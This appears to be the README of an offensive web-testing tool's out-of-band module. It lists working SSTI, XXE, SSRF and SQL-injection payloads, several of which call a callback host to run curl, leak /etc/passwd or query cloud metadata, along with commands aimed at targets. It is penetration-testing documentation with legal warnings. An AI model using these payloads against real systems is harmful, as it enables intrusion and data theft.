# Out-of-Band (OOB) Attack Modules - Dr-Sayer Extension

## Overview

This extension adds comprehensive Out-of-Band (OOB) attack testing capabilities to Dr-Sayer, including:

- **Server-Side Template Injection (SSTI)**
- **XML External Entity (XXE)** 
- **Server-Side Request Forgery (SSRF)**
- **SQL Injection OOB**

## Features

### 🔧 SSTI Testing
- Multiple template engines: Jinja2, FreeMarker, Twig, Velocity
- Header, parameter, and POST body injection
- Callback-based detection

### 🗃️ XXE Testing  
- Generic and blind XXE payloads
- File disclosure attempts
- DTD-based entity resolution
- Callback-based detection

### 🌐 SSRF Testing
- Internal network scanning
- Cloud metadata endpoints (AWS, GCP, Azure)
- Protocol handlers (gopher, dict, sftp, tftp)
- URL bypass techniques (IP encoding, shortened IPs)

### 🗄️ SQL Injection OOB
- Database-specific OOB functions
- xp_dirtree (MSSQL), UTL_INADDR (Oracle), LOAD_FILE (MySQL)
- DNS and HTTP callback triggers

## Usage

### Command Line

```bash
# Run OOB attacks with callback host
python dr-sayer-oob.py -u https://target.com --oob-attacks --oob-callback oob.example.com --accept-risk

# Run specific OOB tests
python dr-sayer-oob.py -u https://target.com --sql --sql-oob --oob-callback oob.example.com --accept-risk

# Run all tests including OOB
python dr-sayer-oob.py -u https://target.com --all --oob-callback oob.example.com --accept-risk
```

### GUI Interface

```bash
# Launch GUI with OOB support
python dr-sayer-gui-oob.py
```

## Configuration

### Setting Up Callback Host

You need a callback server to receive OOB requests:

1. **Burp Suite Collaborator**
   - Generate collaborator URL in Burp
   - Use as `--oob-callback` parameter

2. **Interactsh**
   - Deploy interactsh server
   - Use generated subdomain as callback

3. **Custom Callback Server**
   - Set up HTTP/DNS server
   - Log incoming requests

### Example Callback Hosts

```bash
# Using Burp Collaborator
--oob-callback abc123def456.burpcollaborator.net

# Using Interactsh
--oob-callback xyz789.interact.sh

# Using custom domain
--oob-callback callbacks.yourdomain.com
```

## Attack Vectors

### SSTI Payloads

```
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('curl http://callback/ssti').read()}}

# FreeMarker
${"freemarker"?api.getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://callback/freemarker")}

# Twig
{{app.request.query.get('cmd')|filter('system')}}

# Velocity
$velocity.engine.resourceLoader.getResource('http://callback/velocity')
```

### XXE Payloads

```xml
<!-- Basic XXE -->
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://callback/xxe">]><root>&xxe;</root>

<!-- Blind XXE with DTD -->
<!DOCTYPE xxe [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://callback/xxe?p=%file;'>">
  %eval;
  %error;
]><root/>
```

### SSRF Payloads

```
# Internal services
http://localhost:22
http://127.0.0.1:3306
http://169.254.169.254/latest/meta-data/

# Cloud metadata
http://metadata.google.internal/computeMetadata/v1/
http://instance-data/latest/meta-data/

# Protocol handlers
gopher://callback:70/
dict://callback:11211/
sftp://callback:22/
tftp://callback:69/

# Bypass techniques
http://0x7f000001 (127.0.0.1 hex)
http://2130706433 (127.0.0.1 decimal)
http://127.1 (shortened IP)
```

### SQL Injection OOB

```sql
-- MySQL
1' UNION SELECT LOAD_FILE(CONCAT('\\\\', 'callback', '\\\\mysql'))--

-- MSSQL  
'; DECLARE @x VARCHAR(255); SET @x='\\\\callback\\mssql'; EXEC master..xp_dirtree @x--

-- Oracle
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('callback') FROM DUAL--
```

## Detection Methods

### Callback Analysis

1. **DNS Callbacks**
   - Monitor DNS resolution requests
   - Track subdomain queries
   - Analyze query patterns

2. **HTTP Callbacks**
   - Monitor HTTP requests
   - Analyze User-Agent headers
   - Track request paths and parameters

3. **Protocol-Specific**
   - Gopher protocol requests
   - DICT protocol connections
   - FTP/SFTP connections

### Evidence Collection

The tool automatically:
- Sends OOB payloads to target
- Records callback attempts
- Provides evidence in reports
- Suggests verification steps

## Security Considerations

### ⚠️ Important Notes

1. **Authorization Required**
   - Only test systems you own or have permission to test
   - Unauthorized testing is illegal

2. **Callback Server Security**
   - Secure your callback server
   - Monitor for unauthorized access
   - Rotate callback domains regularly

3. **Network Security**
   - OOB attacks may trigger security alerts
   - Use isolated testing environments
   - Monitor network traffic

4. **Data Protection**
   - OOB attacks may expose sensitive data
   - Secure callback logs
   - Implement proper data retention policies

### Best Practices

1. **Testing Environment**
   ```bash
   # Test on localhost first
   python dr-sayer-oob.py -u http://localhost --oob-attacks --oob-callback localhost.callback --accept-risk
   
   # Then test authorized targets
   python dr-sayer-oob.py -u https://authorized-target.com --oob-attacks --oob-callback oob.example.com --accept-risk
   ```

2. **Callback Monitoring**
   ```bash
   # Monitor callback server logs
   tail -f /var/log/callback-server/access.log
   
   # Use Burp Collaborator client
   java -jar burp-collaborator-client.jar
   ```

3. **Report Analysis**
   - Check callback logs for incoming requests
   - Correlate requests with test timestamps
   - Verify vulnerability evidence

## Integration with Dr-Sayer

### Module Integration

The OOB modules are fully integrated with Dr-Sayer:

```python
from modules.oob_attacks import OOBAttackTester

# Initialize OOB tester
oob_tester = OOBAttackTester(callback_host="oob.example.com")

# Run tests
results = oob_tester.test_target("https://target.com")

# Process results
for finding in results['vulnerabilities']:
    print(f"Found: {finding['type']} - {finding['description']}")
```

### Report Integration

OOB findings are included in all report formats:

- **HTML Reports**: Detailed findings with callback evidence
- **JSON Reports**: Structured data for automation
- **Text Reports**: Simple format for documentation

## Troubleshooting

### Common Issues

1. **No Callbacks Received**
   - Check callback server is running
   - Verify network connectivity
   - Check firewall rules
   - Review payload syntax

2. **False Positives**
   - Verify callback timing
   - Check for automated scanners
   - Review request patterns
   - Cross-reference with other tests

3. **Network Timeouts**
   - Increase timeout values
   - Check target availability
   - Review network configuration
   - Use different callback hosts

### Debug Mode

Enable verbose output for debugging:

```bash
python dr-sayer-oob.py -u https://target.com --oob-attacks --oob-callback oob.example.com -v --accept-risk
```

## Support

For support and questions:
- Email: SayerLinux@outlook.sa
- Report issues on GitHub
- Check documentation for updates

## Legal Notice

This tool is for authorized security testing only. Misuse is illegal and may violate applicable laws. Always ensure you have proper authorization before testing any system.

---

**Remember: With great power comes great responsibility. Use ethically and legally.**